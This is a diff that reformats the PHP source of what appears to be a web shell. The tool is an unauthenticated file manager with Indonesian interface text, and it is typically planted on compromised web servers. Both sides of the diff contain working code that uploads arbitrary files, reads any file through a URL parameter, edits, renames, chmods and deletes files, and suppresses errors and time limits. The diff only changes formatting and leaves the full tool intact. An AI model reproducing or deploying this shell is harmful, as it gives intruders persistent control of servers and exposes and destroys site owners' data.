@@ -1,9 +1,10 @@
 <?php
+
 set_time_limit(0);
 error_reporting(0);
 
 if (get_magic_quotes_gpc()) {
-    foreach ($_POST as $key=>$value) {
+    foreach ($_POST as $key => $value) {
         $_POST[$key] = stripslashes($value);
     }
 }
@@ -66,27 +67,27 @@ if (isset($_GET['path'])) {
 $path = str_replace('\\', '/', $path);
 $paths = explode('/', $path);
 
-foreach ($paths as $id=>$pat) {
-    if ($pat == '' && $id == 0) {
+foreach ($paths as $id => $pat) {
+    if ('' == $pat && 0 == $id) {
         $a = true;
         echo '<a href="?path=/">/</a>';
         continue;
     }
-    if ($pat == '') {
+    if ('' == $pat) {
         continue;
     }
     echo '<a href="?path=';
-    for ($i=0;$i<=$id;$i++) {
+    for ($i = 0; $i <= $id; ++$i) {
         echo "$paths[$i]";
         if ($i != $id) {
-            echo "/";
+            echo '/';
         }
     }
-    echo '">'.$pat.'</a>/';
+    echo '">' . $pat . '</a>/';
 }
 echo '</td></tr><tr><td>';
 if (isset($_FILES['file'])) {
-    if (copy($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name'])) {
+    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
         echo '<font color="green">File Ter-Upload :* </font><br />';
     } else {
         echo '<font color="red">Upload gagal, Servernya kek <img src="http://c.fastcompany.net/asset_files/-/2014/11/11/4F4.gif"/>
@@ -99,13 +100,13 @@ Upload File : <input type="file" name="file" />
 </form>
 </td></tr>';
 if (isset($_GET['filesrc'])) {
-    echo "<tr><td>Current File : ";
+    echo '<tr><td>Current File : ';
     echo $_GET['filesrc'];
     echo '</tr></td></table><br />';
-    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
-} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
-    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
-    if ($_POST['opt'] == 'chmod') {
+    echo '<pre>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</pre>';
+} elseif (isset($_GET['option']) && 'delete' != $_POST['opt']) {
+    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
+    if ('chmod' == $_POST['opt']) {
         if (isset($_POST['perm'])) {
             if (chmod($_POST['path'], $_POST['perm'])) {
                 echo '<font color="green">Change Permission Done.</font><br />';
@@ -114,14 +115,14 @@ if (isset($_GET['filesrc'])) {
             }
         }
         echo '<form method="POST">
-Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
-<input type="hidden" name="path" value="'.$_POST['path'].'">
+Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
+<input type="hidden" name="path" value="' . $_POST['path'] . '">
 <input type="hidden" name="opt" value="chmod">
 <input type="submit" value="Go" />
 </form>';
-    } elseif ($_POST['opt'] == 'rename') {
+    } elseif ('rename' == $_POST['opt']) {
         if (isset($_POST['newname'])) {
-            if (rename($_POST['path'], $path.'/'.$_POST['newname'])) {
+            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                 echo '<font color="green">Change Name Done.</font><br />';
             } else {
                 echo '<font color="red">Change Name Error.</font><br />';
@@ -129,12 +130,12 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
             $_POST['name'] = $_POST['newname'];
         }
         echo '<form method="POST">
-New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
-<input type="hidden" name="path" value="'.$_POST['path'].'">
+New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
+<input type="hidden" name="path" value="' . $_POST['path'] . '">
 <input type="hidden" name="opt" value="rename">
 <input type="submit" value="Go" />
 </form>';
-    } elseif ($_POST['opt'] == 'edit') {
+    } elseif ('edit' == $_POST['opt']) {
         if (isset($_POST['src'])) {
             $fp = fopen($_POST['path'], 'w');
             if (fwrite($fp, $_POST['src'])) {
@@ -145,8 +146,8 @@ New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'
             fclose($fp);
         }
         echo '<form method="POST">
-<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
-<input type="hidden" name="path" value="'.$_POST['path'].'">
+<textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
+<input type="hidden" name="path" value="' . $_POST['path'] . '">
 <input type="hidden" name="opt" value="edit">
 <input type="submit" value="Go" />
 </form>';
@@ -154,14 +155,14 @@ New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'
     echo '</center>';
 } else {
     echo '</table><br /><center>';
-    if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
-        if ($_POST['type'] == 'dir') {
+    if (isset($_GET['option']) && 'delete' == $_POST['opt']) {
+        if ('dir' == $_POST['type']) {
             if (rmdir($_POST['path'])) {
                 echo '<font color="green">Delete Dir Done.</font><br />';
             } else {
                 echo '<font color="red">Delete Dir Error.</font><br />';
             }
-        } elseif ($_POST['type'] == 'file') {
+        } elseif ('file' == $_POST['type']) {
             if (unlink($_POST['path'])) {
                 echo '<font color="green">Delete File Done.</font><br />';
             } else {
@@ -180,7 +181,7 @@ New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'
 </tr>';
 
     foreach ($scandir as $dir) {
-        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') {
+        if (!is_dir("$path/$dir") || '.' == $dir || '..' == $dir) {
             continue;
         }
         echo "<tr>
@@ -217,18 +218,18 @@ New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'
         if (!is_file("$path/$file")) {
             continue;
         }
-        $size = filesize("$path/$file")/1024;
+        $size = filesize("$path/$file") / 1024;
         $size = round($size, 3);
         if ($size >= 1024) {
-            $size = round($size/1024, 2).' MB';
+            $size = round($size / 1024, 2) . ' MB';
         } else {
-            $size = $size.' KB';
+            $size = $size . ' KB';
         }
 
         echo "<tr>
 <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
-<td><center>".$size."</center></td>
-<td><center>";
+<td><center>" . $size . '</center></td>
+<td><center>';
         if (is_writable("$path/$file")) {
             echo '<font color="green">';
         } elseif (!is_readable("$path/$file")) {
@@ -264,26 +265,25 @@ function perms($file)
 {
     $perms = fileperms($file);
 
-    if (($perms & 0xC000) == 0xC000) {
-
-// Socket
+    if (0xC000 == ($perms & 0xC000)) {
+        // Socket
         $info = 's';
-    } elseif (($perms & 0xA000) == 0xA000) {
+    } elseif (0xA000 == ($perms & 0xA000)) {
         // Symbolic Link
         $info = 'l';
-    } elseif (($perms & 0x8000) == 0x8000) {
+    } elseif (0x8000 == ($perms & 0x8000)) {
         // Regular
         $info = '-';
-    } elseif (($perms & 0x6000) == 0x6000) {
+    } elseif (0x6000 == ($perms & 0x6000)) {
         // Block special
         $info = 'b';
-    } elseif (($perms & 0x4000) == 0x4000) {
+    } elseif (0x4000 == ($perms & 0x4000)) {
         // Directory
         $info = 'd';
-    } elseif (($perms & 0x2000) == 0x2000) {
+    } elseif (0x2000 == ($perms & 0x2000)) {
         // Character special
         $info = 'c';
-    } elseif (($perms & 0x1000) == 0x1000) {
+    } elseif (0x1000 == ($perms & 0x1000)) {
         // FIFO pipe
         $info = 'p';
     } else {
@@ -297,7 +297,6 @@ function perms($file)
     $info .= (($perms & 0x0040) ?
 (($perms & 0x0800) ? 's' : 'x') :
 (($perms & 0x0800) ? 'S' : '-'));
-
 
     // Group
     $info .= (($perms & 0x0020) ? 'r' : '-');
